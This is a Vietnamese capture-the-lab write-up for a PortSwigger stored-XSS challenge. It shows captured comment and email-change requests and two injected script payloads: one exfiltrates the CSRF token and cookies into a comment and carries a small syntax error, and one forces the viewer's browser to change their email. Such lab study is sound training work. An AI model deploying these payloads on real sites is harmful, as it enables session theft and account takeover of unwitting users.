Yêu cầu: Phòng thí nghiệm này chứa lỗ hổng XSS được lưu trữ trong chức năng bình luận blog. Để giải quyết phòng thí nghiệm, hãy khai thác lỗ hổng để đánh cắp mã thông báo CSRF, sau đó bạn có thể sử dụng để thay đổi địa chỉ email của người xem bình luận bài đăng trên blog.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau:wiener:peter

Giải pháp: 
- Bài này có điểm vào là phần comment của blog, mục tiêu là thay đổi email của nạn nhân khi biết csrf.
Ta có post request khi post comment như sau:
POST /post/comment HTTP/2
Host: 0a28001b04a2b499805d6735008d0001.web-security-academy.net
Cookie: session=yzvR4uPMkLSgURQ0VApeMB7Z5Gy6seMi
Content-Length: 100
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a28001b04a2b499805d6735008d0001.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a28001b04a2b499805d6735008d0001.web-security-academy.net/post?postId=6
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=mM1uTFuOLU3oprAJRrT1xC7GmKs9WUtp&postId=6&comment=tmt&name=tmt1&email=tmt2%40gmail.com&website=

- Ta có request khi thực hiện thay email như sau:
POST /my-account/change-email HTTP/2
Host: 0a28001b04a2b499805d6735008d0001.web-security-academy.net
Cookie: session=yzvR4uPMkLSgURQ0VApeMB7Z5Gy6seMi
Content-Length: 59
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a28001b04a2b499805d6735008d0001.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a28001b04a2b499805d6735008d0001.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=tmt%40gmail.com&csrf=mM1uTFuOLU3oprAJRrT1xC7GmKs9WUtp
==> ta thấy cả 2 request đều có tham số csrf và nó có cùng 1 giá trị --> ta giả định csrf này được gắn với session của nạn nhân --> nếu muốn thay đổi email, ta thay chỉ cần điền giá trị email muốn thay đổi và mã csrf lấy được 
- Vì ta có thể chèn thẻ vào trong phần body của comment --> ta sẽ tấn công từ điểm này.
- Với FormData:
<script>
window.addEventListener('DOMContentLoaded',function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();
    data.append('csrf',token);
    data.append('postId',10);
    data.append('comment',token+'-'document.cookie);
    data.append('name','victim');
    data.append('email','victim@gmail.com');
    data.append('website','https://google.com');
    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
</script>
tuy nhiên hướng đi này sai vì csrf được gắn với session, khi csrf bị thay đổi mà session không đổi sẽ không thực thi được --> mục tiêu của ta là viết tập lệnh thay vì để lấy csrf của nạn nhân thì khiến nạn nhân sử dụng csrf đó để gửi tới điểm cuối để thay đổi email cùng:
<script>
    window.addEventListener('DOMContentLoaded', function(){
        var token = document.getElementsByName('csrf')[0].value;
        var data = new FormData();
        data.append('email','victim@gmail.com');
        data.append('csrf',token);
        fetch('/my-account/change-email',{
            method: 'POST',
            mode: 'no-cors',
            body: data
        });
    });
</script>
